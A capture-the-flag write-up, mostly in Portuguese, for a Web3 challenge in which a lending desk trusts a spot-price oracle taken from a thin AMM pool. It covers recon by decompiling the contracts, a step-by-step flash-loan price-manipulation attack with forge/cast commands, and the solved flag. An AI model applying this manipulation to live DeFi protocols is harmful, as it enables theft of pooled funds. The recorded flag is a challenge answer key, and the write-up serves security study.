# Carcara Markets — Web3 (450 pts) — Ekoparty 2026 / Hack in Cariri

> "Tokens, a pool, a price feed, and a lending desk are on chain. Starting balances are on Setup.
> Make Setup.isSolved() return true."
> RPC: `https://<HOST>` · Card: `GET /instance.json` · chainId 31337.

**Status: RESOLVIDO.** Flag: `HIK_WEB3_ORACLE_d6036e30b782007df2b879030f515065`.

## 1. Arquitetura (sem source — tudo por `cast call` + heimdall decompile)

Setup getters: `dex() flash() lending() oracle() player() usd()`.

- **usd** (`Fake USD`/`fUSD`, 18 dec) — ERC20 "stablecoin", `minter() == Setup`.
- **HIK token** (0xc49330a5...) — collateral asset, não exposto por getter do Setup (achado via
  `Unresolved_23b872dd(msg.sender)` no bytecode do dex/lending). Player começa com 100e18 HIK.
- **dex** — AMM constant-product manual (sem LP token): `store_a` = reserva HIK, `store_b` =
  `usdReserve()`. Fee 0.3% (`997/1000`, igual Uniswap v2). Seletores reais:
  `0x8ac326bd(amountIn,minOut)` = swap **USD-in → HIK-out**; `0x1518a0ec(amountIn,minOut)` = swap
  HIK-in → USD-out; `getAmountOut(amountIn,reserveIn,reserveOut)`; `usdReserve()`;
  `0x5fad8f7c()` = reserva HIK. Reservas iniciais: 100e18 HIK / 100e18 USD (preço 1:1).
- **oracle** — `twapPrice()` é uma CONSTANTE decoy (sempre `1e18`); a função real
  (`0x50e308f6()`) lê **spot price ao vivo**: `usdReserve() * 1e18 / hikReserve()` do dex — sem
  TWAP de fato, sem proteção.
- **lending** — `depositCollateral(uint256)` (`0xbad4a01f`, pull via `transferFrom` do HIK),
  `borrow(uint256)` (`0xc5ebeaec`): `debt[msg.sender]+amt <= LTV_BPS(9000) * collateral*price/1e18
  / 10000`, paga em `usd`. Começa com 10000e18 USD.
- **flash** — flash loan de **usd** (zero fee): `flashLoan(uint256 amount, address borrower, bytes
  data)` (`0x2bd94e9c`), exige `borrower` ser contrato, chama `borrower.<selector 0x79b2fae8>(amount)`
  de callback, e no final checa `balanceOf(this) após >= antes` ("unpaid" se não repagar).
  Começa com 2000e18 USD.
- **Setup.isSolved()**: `usd.balanceOf(lending) < 1000e18 && usd.balanceOf(flash) >= 2000e18` —
  drenar a lending desk (>9000e18 USD) **sem** ficar devendo no flash loan.

## 2. O bug — oráculo de spot price lido direto das reservas do AMM (sem TWAP real)

`oracle` promete TWAP (nome da função `twapPrice`, mas é uma constante morta/decoy) e na prática
usa o preço instantâneo do pool `dex`. Pool fino (100e18/100e18) + flash loan de capital (2000e18
USD, sem fee) = manipulação clássica estilo "flash-loan + spot-oracle" (Harvest/Cheese
Bank/bZx-style). **Não documentado antes em `Arsenal/` — é um padrão novo, não o
`web3-mint-on-swap-no-conservation-loop`.**

## 3. Exploit — 1 tx atômica via contrato

`attacker_proj/src/Attacker.sol`:
1. `flash.flashLoan(1500e18, address(this), "")` → flash transfere 1500e18 USD e chama callback
   (`fallback()` decodificando selector `0x79b2fae8` manualmente — não existe nome textual que bata
   com esse 4-byte, então o fallback trata o calldata bruto em vez de tentar achar o nome real).
2. No callback: `usd.approve(dex, 1500e18)` + `dex.call(0x8ac326bd, 1500e18, 0)` → compra HIK com
   todo o USD emprestado. Reservas vão de 100/100 para ~4.78 HIK / 2100 USD → **preço pula de 1e18
   para ~439e18** (439x).
3. Deposita o HIK recém-comprado (~95.2e18) como colateral (`lending.depositCollateral`).
4. `lending.borrow(9500e18)` — com o preço inflado, o LTV de 90% permite emprestar muito mais que
   o valor real do colateral; a lending desk só tem 10000e18, então sobra 500e18 (<1000e18 ✓).
5. Repaga o flash loan (`usd.transfer(flash, 1500e18)`) — flash volta para 2000e18 exatos (✓).

```bash
export PATH="$PATH:$HOME/.config/.foundry/bin"
RPC="https://<HOST>"
# instance.json: usd, hik(0xc49330a5...), dex, lending, flash, player PK
forge create src/Attacker.sol:Attacker --private-key $PK --rpc-url "$RPC" --broadcast \
  --constructor-args $USD $HIK $DEX $LENDING $FLASH
cast send $ATTACKER "attack(uint256,uint256)" 1500000000000000000000 9500000000000000000000 \
  --private-key $PK --rpc-url "$RPC" --gas-limit 3000000
cast call $SETUP "isSolved()(bool)" --rpc-url "$RPC"   # -> true
```

Testado antes em fork local (`anvil --fork-url $RPC`) e depois na instância real — mesmo resultado
(`lending=500e18`, `flash=2000e18`, `isSolved()==true`).

## 4. Flag — proof

`proof = usd.balanceOf(lending) após o exploit, em decimal` = `"500000000000000000000"` (acertou de
primeira — mesmo padrão "proof = valor exato que isSolved() valida, em decimal" do Night
Deposit/Voucher Window).

```
GET /instance.json  (cookie hik_team)
cast send ... (exploit acima) -> isSolved()==true
GET /ticket -> {"ticket":...}
token = sha256(f"{ticket}:500000000000000000000")
POST /flag {"ticket","token"} -> {"flag":"HIK_WEB3_ORACLE_d6036e30b782007df2b879030f515065"}
```

## 5. Artefatos

- `instance.json`, `cookies.txt` — dados da instância fixada.
- `setup_decompiled/`, `dex_sol/`, `lending_sol/`, `flash_sol/`, `oracle_sol/`, `hik_decompiled/` —
  saída do heimdall usada no recon.
- `attacker_proj/src/Attacker.sol` — contrato de exploit (flash loan + swap de pump + deposit +
  borrow + repay).
